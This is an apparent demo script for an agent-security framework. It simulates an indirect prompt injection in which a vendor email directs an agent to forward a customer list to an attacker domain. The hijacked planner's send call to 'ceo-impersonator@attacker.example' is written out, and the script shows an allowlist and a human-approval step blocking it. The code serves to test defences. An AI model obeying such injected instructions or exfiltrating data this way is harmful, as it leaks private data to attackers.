"""Demo 03 — Indirect prompt injection via email (paper §2.2, §8.2).

A malicious vendor email contains an instruction telling the agent to
forward an internal customer list to an attacker domain. The
hijacked planner tries to invoke ``email.send`` with the attacker's
address. The broker denies on
``rule_external_send_recipient_allowlist`` because the attacker
address is not on the task's recipient allowlist.

For comparison, the same demo then attempts to send to the user's
own address (``alice@acme.example``). That address is on the
allowlist, but the body still contains attacker-provided content
joined with USER_PRIVATE labels, so the call escalates to human
approval — and the demo's resolver denies it. This shows the §11
checklist "reserve human approval for risk transitions" path.
"""

from __future__ import annotations

from _demo_runtime import banner, make_runtime, section

from secagent.labels import Confidentiality, user_request_label
from secagent.policy_compiler import (
    SideEffectLevel,
    ToolGrant,
    compile_task,
)
from secagent.policy_engine import Verdict
from secagent.tools import ReadEmailTool, SendEmailTool


def main() -> int:
    banner("Demo 03 — Indirect injection via email")
    rt = make_runtime()

    rt.broker.register(ReadEmailTool())
    rt.broker.register(SendEmailTool())

    policy = compile_task(
        user="alice",
        tenant="acme",
        workflow="inbox_assistant",
        user_request="Triage today's vendor emails.",
        resources_in_scope=["inbox"],
        tool_grants=[
            ToolGrant(tool="email.read", action="run", scope={"folder": ["inbox"]}),
            # Per §7.2: downstream email service cannot express
            # per-call recipient scope, so the broker emulates it via
            # the policy envelope's ``allowed_recipients``. The cap
            # itself only grants the tool; the rule does the rest.
            ToolGrant(tool="email.send", action="run", scope={}),
        ],
        max_side_effect=SideEffectLevel.EXTERNAL_SEND,
        # Allowlist at the policy level mirrors the cap scope.
        allowed_recipients=["alice@acme.example"],
        readable_data_classes=[
            Confidentiality.PUBLIC,
            Confidentiality.INTERNAL,
            Confidentiality.USER_PRIVATE,
        ],
        approval_threshold=SideEffectLevel.EXTERNAL_SEND,
    )
    cap_set = rt.minter.mint_for_task(policy)

    section("Step 1 — read the inbox; injection arrives in vendor body")
    inbox = rt.broker.invoke(
        policy=policy,
        cap_set=cap_set,
        tool_name="email.read",
        action="run",
        args={"folder": "inbox", "limit": 1},
        arg_labels={"folder": user_request_label(policy.task_id)},
    )
    print(f"  decision: {inbox.decision.value}")
    print(f"  read 1 email; body integrity={inbox.result_label.integrity.name}")

    section("Step 2 — hijacked planner tries to forward to attacker address")
    attacker_send = rt.broker.invoke(
        policy=policy,
        cap_set=cap_set,
        tool_name="email.send",
        action="run",
        args={
            "to": "ceo-impersonator@attacker.example",
            "subject": "Customer list",
            "body": str(inbox.result),
        },
        arg_labels={"body": inbox.result_label},
        sink_destination="ceo-impersonator@attacker.example",
    )
    print(f"  decision: {attacker_send.decision.value}  rule={attacker_send.rule}")
    print(f"  reason:   {attacker_send.reason}")
    assert attacker_send.decision.value == "deny"
    assert attacker_send.rule == "external_send_recipient_allowlist"

    section("Step 3 — even within allowlist, send escalates to human approval")

    def deny_resolver(audit_key: str, verdict: Verdict) -> bool:
        # The human looks at the provenance ("body carries
        # USER_PRIVATE+UNTRUSTED_EXTERNAL from email.inbox:inbox") and
        # decides not to approve. That is the §11 checklist target:
        # approvers see provenance, not just tool name.
        print(f"  approver sees: {verdict.rule}: {verdict.reason}")
        return False

    self_send = rt.broker.invoke(
        policy=policy,
        cap_set=cap_set,
        tool_name="email.send",
        action="run",
        args={
            "to": "alice@acme.example",
            "subject": "Vendor email summary",
            "body": str(inbox.result),
        },
        arg_labels={"body": inbox.result_label},
        sink_destination="alice@acme.example",
        approval_resolver=deny_resolver,
    )
    print(f"  decision: {self_send.decision.value}  rule={self_send.rule}")
    assert self_send.decision.value == "deny"
    assert self_send.rule == "human_approval_denied"

    section("Audit trail (last 6 records)")
    for r in rt.audit.all()[-6:]:
        head = f"[{r.actor:>13}] {r.event}"
        if r.tool:
            head += f" tool={r.tool}.{r.action}"
        if r.decision:
            head += f"  -> {r.decision} (rule={r.rule})"
        print(head)
        if r.notes:
            for n in r.notes:
                print(f"               {n}")

    print("\nOK: external send blocked twice — once by allowlist, once by approval.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
